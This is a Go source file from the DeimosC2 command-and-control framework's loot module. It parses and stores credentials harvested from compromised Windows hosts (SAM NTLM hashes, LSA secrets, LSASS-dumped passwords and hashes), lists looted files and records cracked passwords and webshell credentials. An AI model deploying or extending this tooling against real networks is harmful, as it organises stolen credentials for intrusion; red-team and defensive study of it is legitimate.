package loot

import (
	"encoding/json"
	"io/ioutil"
	"os"
	"path/filepath"
	"regexp"
	"strconv"

	"github.com/DeimosC2/DeimosC2/c2/lib/sqldb"
	"github.com/DeimosC2/DeimosC2/c2/lib/validation"
	"github.com/DeimosC2/DeimosC2/c2/webserver/websockets"
	"github.com/DeimosC2/DeimosC2/lib/logging"
	"github.com/gorilla/websocket"
)

type loot struct {
	CredType string      `json:"type"`
	CredData interface{} `json:"data"`
}

type directory struct {
	DirectoryName string `json:"directoryname"`
	Perms         string `json:"perms"`
	LastAccess    string `json:"lastaccess"`
}

type fileData struct {
	Filename   string `json:"filename"`
	Filesize   string `json:"filesize"`
	FilePerms  string `json:"fileperms"`
	LastAccess string `json:"lastaccess"`
}

//SaveLoot will save the loot to the struct and DB
func SaveLoot(agentKey string, data []byte) {
	var lootData loot
	err := json.Unmarshal(data, &lootData)
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}

	m := lootData.CredData.(map[string]interface{})

	//Save the credentials in the DB obtained from certain credential harvesting modules
	switch {
	case lootData.CredType == "SAM":
		for _, value := range m {
			v := value.(map[string]interface{})
			val := validation.ValidateMap(v, []string{"Username", "NTLM"})
			if val == false {
				return
			}
			userName := v["Username"].(string)
			ntlmHash := v["NTLM"].(string)
			sqldb.AddLoot(agentKey, userName, "", ntlmHash, lootData.CredType, "", "", "", false)
		}
	case lootData.CredType == "LSA":
		for _, value := range m {
			v := value.(map[string]interface{})
			val := validation.ValidateMap(v, []string{"LSAName", "LSAHash"})
			if val == false {
				return
			}
			lsaUser := v["LSAName"].(string)
			lsaHash := v["LSAHash"].(string)
			sqldb.AddLoot(agentKey, lsaUser, "", lsaHash, lootData.CredType, "", "", "", false)
		}
	case lootData.CredType == "LSASS":
		for _, value := range m {
			v := value.(map[string]interface{})
			val := validation.ValidateMap(v, []string{"domain", "lmhash", "nthash", "password", "ssp", "username"})
			if val == false {
				return
			}
			lsassUser := v["username"].(string)
			lsassPass := v["password"].(string)
			lsassLMHash := v["lmhash"].(string)
			lsassNTHash := v["nthash"].(string)
			lsassDomain := v["domain"].(string)
			lsassSSP := v["ssp"].(string)
			sqldb.AddLoot(agentKey, lsassUser, lsassPass, lsassLMHash+":"+lsassNTHash, lootData.CredType, lsassSSP, "", lsassDomain, false)
		}
	}
}

func listLootFiles(path string) (bool, string) {
	//Arrays to store the file and directory info
	var fileArray []fileData
	var dirArray []directory
	var lootFiles string

	//Current directory
	cwd, err := os.Getwd()
	if err != nil {
		logging.ErrorLogger.Println(err.Error())
	}
	//Full path of the looted directory
	lootPath := filepath.Join(cwd, "resources", "looted")

	//Check to ensure path meets valid characters
	var validName = regexp.MustCompile(`[^a-zA-Z0-9-\/]+`)
	if validName.MatchString(path) == false {
		fullPath := filepath.Join(lootPath, path)
		files, _ := ioutil.ReadDir(fullPath)

		for _, file := range files {
			if file.IsDir() {
				//If files point to the directory{} struct
				dirs := directory{
					DirectoryName: file.Name(),
					Perms:         file.Mode().Perm().String(),
					LastAccess:    file.ModTime().String(),
				}
				dirArray = append(dirArray, dirs)
			} else {
				//If files point to the files{} struct
				file := fileData{
					Filename:   file.Name(),
					Filesize:   strconv.FormatInt(file.Size(), 10),
					FilePerms:  file.Mode().Perm().String(),
					LastAccess: file.ModTime().String(),
				}
				fileArray = append(fileArray, file)
			}
		}

		//JSON Marshal both the directory array and the file array
		dirMsg, _ := json.Marshal(dirArray)
		fileMsg, _ := json.Marshal(fileArray)
		if path == "" {
			path = "/looted/"
		} else {
			path = "/looted/" + path + "/"
		}
		lootFiles = "{\"Path\": \"" + path + "\", \"Directories\":" + string(dirMsg) + ", \"Files\":" + string(fileMsg) + "}"
	} else {
		return false, "Incorrect path"
	}

	return true, lootFiles
}

//ParseSocket takes in data from the websocket, acts on it and then alerts the user of the outcome
func ParseSocket(fname string, data interface{}, ws *websocket.Conn) {
	logging.Logger.Println("Parsing Loot")

	//List all Loot
	if fname == "List" {
		rData := sqldb.ListAllLoot()
		success := true
		outMsg := websockets.SendMessage{
			Type:         "Loot",
			FunctionName: "List",
			Data:         rData,
			Success:      success,
		}
		websockets.AlertSingleUser(outMsg, ws)
		return
	}

	m := data.(map[string]interface{})

	//List loot based on agent name
	if fname == "ListAgentLoot" {
		if !validation.ValidateMapAlert(m, []string{"agentKey"}, ws) {
			return
		}
		rData := sqldb.ListLoot(m["agentKey"].(string))
		success := true
		outMsg := websockets.SendMessage{
			Type:         "Loot",
			FunctionName: "ListAgentLoot",
			Data:         rData,
			Success:      success,
		}
		websockets.AlertSingleUser(outMsg, ws)
	} else if fname == "ListLootFiles" {
		if !validation.ValidateMapAlert(m, []string{"path"}, ws) {
			return
		}
		success, rData := listLootFiles(m["path"].(string))
		outMsg := websockets.SendMessage{
			Type:         "Loot",
			FunctionName: "ListLootFiles",
			Data:         rData,
			Success:      success,
		}
		websockets.AlertSingleUser(outMsg, ws)
	} else if fname == "EditPass" {
		if !validation.ValidateMapAlert(m, []string{"password", "hash"}, ws) {
			return
		}
		success, rCount := sqldb.EditPassLoot(m["password"].(string), m["hash"].(string))
		outMsg := websockets.SendMessage{
			Type:         "Loot",
			FunctionName: "EditPass",
			Data:         strconv.Itoa(rCount),
			Success:      success,
		}
		websockets.AlertSingleUser(outMsg, ws)
	} else if fname == "Add" {
		if !validation.ValidateMapAlert(m, []string{"agentKey", "userName", "password", "hash", "credtype", "host", "domain", "webshell"}, ws) {
			return
		}
		if m["webshell"].(bool) == true {
			sqldb.AddLoot(m["agentKey"].(string), m["userName"].(string), m["password"].(string), m["hash"].(string), m["credtype"].(string), "", m["host"].(string), m["domain"].(string), true)
		} else {
			sqldb.AddLoot(m["agentKey"].(string), m["userName"].(string), m["password"].(string), m["hash"].(string), m["credtype"].(string), "", m["host"].(string), m["domain"].(string), false)
		}
		outMsg := websockets.SendMessage{
			Type:         "Loot",
			FunctionName: "Add",
			Data:         "Added",
			Success:      true,
		}
		websockets.AlertSingleUser(outMsg, ws)
	}
}
